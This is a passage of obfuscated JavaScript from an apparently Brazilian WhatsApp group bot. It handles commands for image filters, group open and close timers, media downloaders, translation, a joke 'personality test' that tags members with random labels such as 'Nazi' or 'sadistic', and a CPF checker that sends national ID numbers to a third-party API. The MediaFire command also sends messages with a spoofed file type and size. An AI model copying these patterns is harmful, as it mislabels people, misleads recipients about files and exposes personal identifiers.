                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              _0x403602("ꔷ㆒⸼݇҉ֻ᠂⃟ " + _0x55a6ac + " 𝖠𝗀𝗎𝖺𝗋𝖽𝖾 𝖾𝗌𝗍𝗈𝗎 𝗉𝗎𝗑𝖺𝗇𝖽𝗈 𝗌𝖾𝗎 𝗍𝖾𝗌𝗍𝖾』");
              sleep(7000);
              try {
                pikona = await ama.profilePictureUrl(_0x32e455.split("@")[0] + "@c.us", "image");
              } catch {
                pikona = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
              }
              try {
                let _0x4684f1 = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x4e3a8c = _0x4684f1[Math.floor(Math.random() * _0x4684f1.length)];
                let _0x114fe7 = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x264014 = _0x114fe7[Math.floor(Math.random() * _0x114fe7.length)];
                let _0x3619e1 = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x54063a = _0x3619e1[Math.floor(Math.random() * _0x3619e1.length)];
                let _0x287f3d = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x1c820c = _0x287f3d[Math.floor(Math.random() * _0x287f3d.length)];
                let _0x16d336 = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x13f749 = _0x16d336[Math.floor(Math.random() * _0x16d336.length)];
                let _0xf9be47 = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x16d100 = _0xf9be47[Math.floor(Math.random() * _0xf9be47.length)];
                let _0x27e94e = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x44838d = _0x27e94e[Math.floor(Math.random() * _0x27e94e.length)];
                let _0x2f347e = ["10", "20", "30", "40", "50", "60", "70", "80", "90", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x380e8f = _0x2f347e[Math.floor(Math.random() * _0x2f347e.length)];
                let _0x3ea514 = ["10", "20", "32", "40", "50", "60", "70", "80", "93", "100", "4", "48", "67", "54", "34", "12", "8", "27", "4", "22", "8"];
                var _0x132424 = _0x2f347e[Math.floor(Math.random() * _0x3ea514.length)];
                const _0x595126 = "\n[🍃] 𝚁𝙴𝚂𝚄𝙻𝚃𝙰𝙳𝙾 𝙳𝙾 𝚃𝙴𝚂𝚃𝙴 [🍃]\n╔═════ °❀•°🤖°•❀°═════╗\n🍓░⃟⃛ ➮𝙽𝙰𝚉𝙸𝚂𝚃𝙰: " + _0x4e3a8c + "%\n🍓░⃟⃛ ➮𝙴𝙽𝚅𝙰𝚂𝙸𝚅𝙾: " + _0x132424 + "\n🍓░⃟⃛ ➮𝙲𝙾𝙼𝙿𝚄𝙻𝚂𝙸𝚅𝙾(A): " + _0x264014 + "%\n🍓░⃟⃛ ➮𝙰𝙽𝚃𝙸𝚂𝙾𝙲𝙸𝙰𝙻: " + _0x54063a + "%\n🍓░⃟⃛ ➮𝙳𝙴𝙿𝚁𝙴𝚂𝚂𝙸𝚅𝙾: " + _0x1c820c + "%\n🍓░⃟⃛ ➮𝙴𝚂𝚀𝚄𝙸𝚉𝙾𝙵𝚁𝙴̂𝙽𝙸𝙲𝙾: " + _0x13f749 + "%\n🍓░⃟⃛ ➮𝚂𝙰́𝙳𝙸𝙲𝙾: " + _0x16d100 + "%\n🍓░⃟⃛ ➮𝙿𝙰𝚁𝙰𝙽𝙾́𝙸𝙲𝙾: " + _0x44838d + "%\n🍓░⃟⃛ ➮𝚁𝙾𝙼𝙰̂𝙽𝚃𝙸𝙲𝙾: " + _0x380e8f + "%\n╚═════ °❀•°🤖°•❀°═════╝\n";
                const _0x388b1a = {
                  url: pikona
                };
                const _0x27894e = {
                  image: _0x388b1a,
                  caption: _0x595126,
                  mentions: [_0x32e455]
                };
                const _0x35bdec = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x27894e, _0x35bdec);
              } catch (_0x3c987e) {
                console.log(_0x3c987e);
              }
              break;
            case "batatinha123":
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite\n\n    " + _0x1d93be + "modobrincadeira 1");
              }
              _0x403602("▧⃯⃟🍓𝙱𝙰𝚃𝙰𝚃𝙸𝙽𝙷𝙰 𝙵𝚁𝙸𝚃𝙰 𝟷𝟸𝟹ꫂ");
              let _0x530595 = ["𝘝𝘤 𝘴𝘦 𝘮𝘦𝘤𝘩𝘦𝘶, 𝘢 𝘣𝘰𝘯𝘦𝘤𝘢 𝘮𝘢𝘵𝘰𝘶 𝘷𝘤 🪆", "𝘜𝘍𝘈𝘈𝘈... 𝘍𝘰𝘪 𝘱𝘰𝘳 𝘱𝘰𝘶𝘤𝘰 𝘷𝘤 𝘤𝘰𝘯𝘴𝘦𝘨𝘶𝘪𝘶", "𝘝𝘤 𝘴𝘦 𝘮𝘦𝘤𝘩𝘦𝘶 𝘦 𝘮𝘰𝘳𝘳𝘦𝘶.....", "𝘗𝘈𝘙𝘈𝘉𝘌́𝘕𝘚, 𝘝𝘤 𝘧𝘰𝘪 𝘱𝘢𝘳𝘢 𝘢 𝘱𝘳𝘰́𝘹𝘪𝘮𝘢 𝘧𝘢𝘴𝘦."];
              var _0x5e3df6 = _0x530595[Math.floor(Math.random() * _0x530595.length)];
              await sleep(20000);
              _0x403602("\nき⃟❈🌹𝐑𝐎𝐔𝐍𝐃𝟔き⃟❈\n╔═════ °❀•°🪆°•❀°═════╗\n║\n║│▧⃯⃟💬𝚁𝙴𝚂𝚄𝙻𝚃𝙰𝙳𝙾: " + _0x5e3df6 + "\n║\n╚═════ °❀•°🪆°•❀°═════╝\n");
              break;
            case "fotoshop":
              {
                const _0x13b1b0 = {
                  text: "📸️",
                  key: _0x302296.key
                };
                const _0x19a2a9 = {
                  react: _0x13b1b0
                };
                _0x263319.sendMessage(_0x4f1071, _0x19a2a9);
                const _0x3aa545 = {
                  image: {
                    url: "https://telegra.ph/file/e256ee2949bc25acdaa04.jpg"
                  },
                  caption: "\n┏━━━≪_📸️_≫━━━┓\n ▏📸 𝙁𝙊𝙏𝙊𝙎𝙃𝙊𝙋 📸\n┗━━━━━━━━━━┛\n ▏✾▹ " + _0x1d93be + "fotohd (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "fotohd2 (Marca uma imagem)\n  ▏✾▹ " + _0x1d93be + "fotohd3 (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "removebg (marca-imagem)\n ▏✾▹ " + _0x1d93be + "fotozombie (marca-imagem)\n ▏✾▹ " + _0x1d93be + "fotocartoon (marca-imagem\n  ▏✾▹ " + _0x1d93be + "fotogta (marca-imagem)\n  \n ▏✾▹ " + _0x1d93be + "blur (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "gaussian (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sharpen (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "convolution (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "invert (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "grayscale (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sepia (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "opacity (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "fade (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "posterize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "brightness (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "contrast (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "color (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "threshold (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "dither565 (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "dither16 (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "rotate (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "flip (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "mirror (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "crop (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "autocrop (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "contain (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "cover (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "resize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "scaleToFit (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "scale (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "pixelate (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "composite (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "blit (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "mask (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "emboss (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "edgeDetect (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "normalize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "desaturate (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "hue (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "tint (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "blend (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "mosaic (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "median (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "lighten (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "darken (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "gamma (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "vintage (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "kodachrome (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "technicolor (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "polaroid (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "toGreyscale (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "toSepia (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "rainbow (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "purple (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "green (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "blue (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "red (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "solarize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "tintBlue (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "tintRed (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "vibrance (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "lomo (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "clarity (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sinCity (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sunrise (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "crossProcess (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "orangePeel (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "love (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "grungy (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "jarques (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "pinhole (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "oldBoot (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "glowSun (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "haze (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "negative (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "saturate (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "linearBurn (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "linearDodge (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "hueRotate (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "brightnessContrast (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "blendWithImage (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "tintWithAlpha (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "vignette (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "noise (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "glitch (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "pixelSort (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "kaleidoscope (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "pixelize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "asciiArt (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sphere (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "swirl (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "polaroidBorder (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "hexagonPixelate (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "mosaic (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "waterEffect (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "tvStatic (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "paperCut (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "nightVision (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sketch (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "hologram (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "oilPainting (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "filmGrain (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "neonGlow (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "halftone (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "crystallize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "heatmap (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "warp (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "crossProcess (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "comicBook (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "solarize (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "emboss (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "lensFlare (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "toonify (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "neon (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "glitchEffect (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "vintage (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "bloom (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "motionBlur (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "cartoon (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "tiltShift (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "chromaticAberration (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "oilPainting (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "cartoonEffect (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "crosshatch (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "sobelEdgeDetection (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "waterRipple (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "swirl (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "frostedGlass (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "displacementMap (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "kaleidoscope (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "bloomEffect (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "heatmapEffect (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "pixelSort (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "glitchArt (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "liquify (Marca uma imagem)\n ▏✾▹ " + _0x1d93be + "fotoanime (Marca uma imagem)\n┗━━━━━━━━━━┛\n    ",
                  footer: "🔥" + NomeDoBot + "🔥️",
                  headerType: 4
                };
                const _0x444ce3 = {
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, _0x3aa545, _0x444ce3);
              }
              break;
            case "contar":
              if (_0x40e45c.length == 0) {
                return _0x403602("0 caracteres, pois obviamente não há texto😀");
              }
              const _0x43d9d4 = _0x2e320b.slice(8).length;
              if (_0x43d9d4 === 1) {
                _0x403602("O texto possui " + _0x43d9d4 + " caractere.");
              } else if (_0x43d9d4 > 1) {
                _0x403602("O texto possui " + _0x43d9d4 + " caracteres.");
              }
              break;
            case "fonte":
              const _0x5d3452 = _0x40e45c.join(" ");
              const _0x1bbd9f = {
                A: "𝐀",
                B: "𝐁",
                C: "𝐂",
                D: "𝐃",
                E: "𝐄",
                F: "𝐅",
                G: "𝐆",
                H: "𝐇",
                I: "𝐈",
                J: "𝐉",
                K: "𝐊",
                L: "𝐋",
                M: "𝐌",
                N: "𝐍",
                O: "𝐎",
                P: "𝐏",
                Q: "𝐐",
                R: "𝐑",
                S: "𝐒",
                T: "𝐓",
                U: "𝐔",
                V: "𝐕",
                W: "𝐖",
                X: "𝐗",
                Y: "𝐘",
                Z: "𝐙",
                "0": "𝟎",
                "1": "𝟏",
                "2": "𝟐",
                "3": "𝟑",
                "4": "𝟒",
                "5": "𝟓",
                "6": "𝟔",
                "7": "𝟕",
                "8": "𝟖",
                "9": "𝟗"
              };
              const _0x2f55d1 = {
                a: "𝐚",
                b: "𝐛",
                c: "𝐜",
                d: "𝐝",
                e: "𝐞",
                f: "𝐟",
                g: "𝐠",
                h: "𝐡",
                i: "𝐢",
                j: "𝐣",
                k: "𝐤",
                l: "𝐥",
                m: "𝐦",
                n: "𝐧",
                o: "𝐨",
                p: "𝐩",
                q: "𝐪",
                r: "𝐫",
                s: "𝐬",
                t: "𝐭",
                u: "𝐮",
                v: "𝐯",
                w: "𝐰",
                x: "𝐱",
                y: "𝐲",
                z: "𝐳"
              };
              let _0x347dd0 = "";
              for (const _0x4423bd of _0x5d3452) {
                if (_0x4423bd in _0x1bbd9f) {
                  _0x347dd0 += _0x1bbd9f[_0x4423bd];
                } else if (_0x4423bd in _0x2f55d1) {
                  _0x347dd0 += _0x2f55d1[_0x4423bd];
                } else {
                  _0x347dd0 += _0x4423bd;
                }
              }
              _0x403602("" + _0x347dd0);
              break;
            case "abrirgp":
              if (!_0xd20756) {
                return _0x403602(resposta.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(resposta.adm);
              }
              if (!_0x5550bd) {
                return _0x403602(resposta.botadm);
              }
              if (_0x40e45c.length < 2) {
                return _0x403602("Errado exemplo:\n" + _0x1d93be + "abrirgp 29 s \n\n𝗦 pra segundos\n𝗠 pra minutos\n𝗛 pra horas\n𝗗 pra dias.");
              }
              const _0x4c3e78 = parseInt(_0x40e45c[0]);
              const _0x57d83a = _0x40e45c[1].toLowerCase();
              let _0x3e5f82;
              if (_0x57d83a === "s") {
                _0x3e5f82 = _0x4c3e78 * 1000;
              } else if (_0x57d83a === "m") {
                _0x3e5f82 = _0x4c3e78 * 60000;
              } else if (_0x57d83a === "h") {
                _0x3e5f82 = _0x4c3e78 * 3600000;
              } else if (_0x57d83a === "d") {
                _0x3e5f82 = _0x4c3e78 * 86400000;
              } else {
                return _0x403602("Unidade de tempo não suportada. Use exemplo:\n" + _0x1d93be + "abrirgp 29 𝗦 \n\n𝗦 pra segundos\n𝗠 pra minutos\n𝗛 pra horas\n𝗗 pra dias.");
              }
              _0x403602("O grupo será aberto em " + _0x4c3e78 + " " + _0x57d83a);
              setTimeout(() => {
                const _0x5653aa = "*Agora o grupo foi reaberto pelo administrador @" + _0x32e455.split("@")[0] + "*\nAgora, os membros podem enviar mensagens.";
                _0x263319.groupSettingUpdate(_0x4f1071, "not_announcement");
                _0x403602(_0x5653aa);
              }, _0x3e5f82);
              break;
            case "fechargp":
              if (!_0xd20756) {
                return _0x403602(resposta.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(resposta.adm);
              }
              if (!_0x5550bd) {
                return _0x403602(resposta.botadm);
              }
              if (_0x40e45c.length < 2) {
                return _0x403602("Errado exemplo:\n" + _0x1d93be + "fechar 29 s \n\n𝗦 pra segundos\n𝗠 pra minutos\n𝗛 pra horas\n𝗗 pra dias.");
              }
              const _0x3ca041 = parseInt(_0x40e45c[0]);
              const _0x4ccebc = _0x40e45c[1].toLowerCase();
              let _0x5c8be8;
              if (_0x4ccebc === "s") {
                _0x5c8be8 = _0x3ca041 * 1000;
              } else if (_0x4ccebc === "m") {
                _0x5c8be8 = _0x3ca041 * 60000;
              } else if (_0x4ccebc === "h") {
                _0x5c8be8 = _0x3ca041 * 3600000;
              } else if (_0x4ccebc === "d") {
                _0x5c8be8 = _0x3ca041 * 86400000;
              } else {
                return _0x403602("Unidade de tempo não suportada. Use exemplo:\n" + _0x1d93be + "fechargp 29 𝗦 \n\n𝗦 pra segundos\n𝗠 pra minutos\n𝗛 pra horas\n𝗗 pra dias.");
              }
              _0x403602("O grupo será fechado em " + _0x3ca041 + " " + _0x4ccebc);
              setTimeout(() => {
                const _0x4dc8ea = "*O grupo foi fechado pelo administrador @" + _0x32e455.split("@")[0] + "*\nAgora, os membros não podem enviar mensagens.";
                _0x263319.groupSettingUpdate(_0x4f1071, "announcement");
                _0x403602(_0x4dc8ea);
              }, _0x5c8be8);
              break;
            case "g1":
              try {
                const _0x262bcb = await fetchJson(SITE_JEFF_APIS + "/api/noticias/globo?apikey=" + _0x512d5e);
                const _0x1a1392 = _0x262bcb.pesquisa.resultado;
                let _0xd5bf31 = "";
                for (let _0x20c512 = 0; _0x20c512 < _0x1a1392.length; _0x20c512++) {
                  const _0x5ed7c3 = _0x1a1392[_0x20c512].noticia;
                  const _0x214880 = _0x1a1392[_0x20c512].imagem;
                  const _0x3e5c73 = _0x1a1392[_0x20c512].desc;
                  const _0x172006 = _0x1a1392[_0x20c512].categoria;
                  const _0x54d751 = _0x1a1392[_0x20c512].link;
                  const _0x38546f = _0x1a1392[_0x20c512].postado;
                  _0xd5bf31 += _0x5ed7c3 + "\n" + _0x214880 + "\n" + _0x3e5c73 + "\n" + _0x172006 + "\n" + _0x54d751 + "\n" + _0x38546f + "\n";
                }
                _0x403602(_0xd5bf31);
              } catch (_0x1a3e53) {
                console.error("Ocorreu um erro ao buscar as notícias:", _0x1a3e53);
                _0x403602("Ocorreu um erro ao buscar as notícias. Por favor, tente novamente mais tarde.");
              }
              break;
            case "mediafire":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Coloque um link");
                }
                if (!_0x4eac7e(_0x1d6557) || !_0x1d6557.includes("mediafire.com")) {
                  return _0x403602("Link inválido!");
                }
                _0x403602(enviar.espere);
                mfdw = await mediafire("" + _0x40e45c[0]);
                if (mfdw[0].peso.split("MB")[0] >= 250) {
                  buttonMessage02 = {
                    document: fs.readFileSync("./DADOS/docf.txt"),
                    mimetype: "application/pdf",
                    mentions: [_0x32e455],
                    fileName: NomeDoBot + " ✅",
                    fileLength: 665999000000,
                    caption: "*Mediafire Downloader*\n[📌] NOME: " + mfdw[0].nome + "\n[⚖️] PESO: " + mfdw[0].peso + "\n[🗂️] ARQUIVO: " + mfdw[0].tipo,
                    footer: "Arquivo muito pesado para ser enviado pelo WhatsApp."
                  };
                  _0x263319.sendMessage(_0x4f1071, buttonMessage02);
                } else {
                  buttonMessage02 = {
                    document: fs.readFileSync("./DADOS/docf.txt"),
                    mimetype: "application/pdf",
                    mentions: [_0x32e455],
                    fileName: NomeDoBot + " ✅",
                    fileLength: 665999000000,
                    caption: "*Mediafire Downloader*\n[??] NOME: " + mfdw[0].nome + "\n[⚖️] PESO: " + mfdw[0].peso + "\n[??️] ARQUIVO: " + mfdw[0].tipo,
                    footer: "Aproveita Que to Baixando, e Segue no Insta\n@jefferson_ddos\nX-bot"
                  };
                  _0x263319.sendMessage(_0x4f1071, buttonMessage02);
                  await sleep(1000);
                  const _0x38e560 = {
                    url: mfdw[0].link
                  };
                  const _0x55bd59 = {
                    document: _0x38e560,
                    fileName: mfdw[0].nome,
                    mimetype: mfdw[0].tipo,
                    mentions: [_0x32e455]
                  };
                  const _0x4e46dc = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x55bd59, _0x4e46dc);
                }
              } catch (_0x4ed1ed) {
                console.log(_0x4ed1ed);
                _0x403602("Ocorreu um erro.");
              }
              break;
            case "fotomatrix":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                post = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                imagem = await downloadContentFromMessage(post, "image");
                base64 = Buffer.from([]);
                for await (const _0x4dc2c3 of imagem) {
                  base64 = Buffer.concat([base64, _0x4dc2c3]);
                }
                _0x403602(enviar.espere);
                _0x2722a9 = await upload(base64);
                const _0x17368d = {
                  url: "https://api.popcat.xyz/hue-rotate?img=" + _0x2722a9 + "&deg=120\n"
                };
                const _0x1875b4 = {
                  image: _0x17368d
                };
                _0x263319.sendMessage(_0x4f1071, _0x1875b4).catch(_0x54574f => {
                  return _0x403602("" + infoerror);
                });
              } else {
                _0x403602("Selecione uma imagem para transformar. ");
              }
              break;
            case "traduzir":
              if (!_0x1d6557) {
                return _0x403602("Digite algo EX:\n" + _0x1d93be + "traduzir pt/cat\n\nUse " + _0x1d93be + "idiomas");
              }
              var [_0x419b65, _0x4100d8] = _0x1d6557.split("/");
              if (!_0x1d6557.includes("/")) {
                return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " pt/cat\n\nUse " + _0x1d93be + "idiomas");
              }
              cuzin = await fetchJson(SITE_JEFF_APIS + "/api/info/translate?ling=" + _0x419b65 + "&texto=" + _0x4100d8 + "&apikey=" + _0x512d5e);
              cuzin2 = cuzin.result;
              cuzin3 = cuzin2;
              _0x403602("𝐓𝐫𝐚𝐝𝐮𝐳𝐢𝐝𝐨: " + cuzin3);
              break;
            case "fotocinza":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                post = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                imagem = await downloadContentFromMessage(post, "image");
                base64 = Buffer.from([]);
                for await (const _0x326b5f of imagem) {
                  base64 = Buffer.concat([base64, _0x326b5f]);
                }
                _0x403602(enviar.espere);
                _0x2722a9 = await upload(base64);
                const _0x468a31 = {
                  url: "https://api.popcat.xyz/greyscale?image=" + _0x2722a9
                };
                const _0x31dd4a = {
                  image: _0x468a31
                };
                _0x263319.sendMessage(_0x4f1071, _0x31dd4a).catch(_0x48457a => {
                  return _0x403602("" + infoerror);
                });
              } else {
                _0x403602("Selecione uma imagem para transformar. ");
              }
              break;
            case "vrcpf":
            case "validarcpf":
            case "verificarcpf":
            case "verificar_cpf":
            case "validar_cpf":
              if (_0x1d6557.trim().length < 11) {
                return _0x403602("Digite o cpf, Exemplo: " + (_0x1d93be + _0x3dec88) + " 699.196.160-44");
              }
              _0x403602("Aguarde, enviando resultado.");
              try {
                const _0x4432d2 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: "https://api.bronxyshost.com.br/api-bronxys/vr_cpf?cpf=" + _0x1d6557.trim() + "&apikey=" + _0x44a335
                  }
                }, _0x4432d2);
              } catch (_0x5c7b52) {
                _0x403602("" + infoerror);
              }
              break;
            case "soundcloud":
            case "scdl":
              if (!_0x1d6557.includes("soundcloud.com")) {
                return _0x403602("Ops, link invalido, só baixo vídeos do " + _0x3dec88 + " com link");
              }
              if (!_0x1d6557) {
                return _0x403602("Tá faltando aí! Cadê o link da música no SoundCloud hein? 😴");
              }
              _0x403602(enviar.espere);
              try {
                zan = await fetchJson(SITE_JEFF_APIS + "/api/soundcloud?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                tinyUrl = await axios.get("https://tinyurl.com/api-create.php?url=" + zan.resultado.link_dl);
                txt = "🎶 *Música:* " + zan.resultado.titulo + "\n📤 *Total de Downloads:* " + zan.resultado.total_downloads + "\n\n";
                txt += "Caso não seja enviado o áudio, faça o download por meio do link: " + tinyUrl.data;
                const _0x21ef08 = await axios.get(zan.resultado.capa, {
                  responseType: "arraybuffer"
                });
                const _0xbfae91 = Buffer.from(_0x21ef08.data);
                const _0xe00957 = {
                  url: zan.resultado.capa,
                  data: _0xbfae91
                };
                const _0x359f66 = {
                  image: _0xe00957,
                  caption: txt
                };
                const _0x30d9e1 = {
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, _0x359f66, _0x30d9e1);
                const _0x2e1bd2 = {
                  url: zan.resultado.link_dl
                };
                const _0x2bcdca = {
                  title: "Música: " + zan.resultado.titulo,
                  body: "Total de Downloads: " + zan.resultado.total_downloads,
                  mediaType: 2,
                  thumbnail: _0xbfae91,
                  mediaUrl: "" + zan.resultado.link_dl,
                  sourceUrl: "" + zan.resultado.link_dl
                };
                const _0x355f05 = {
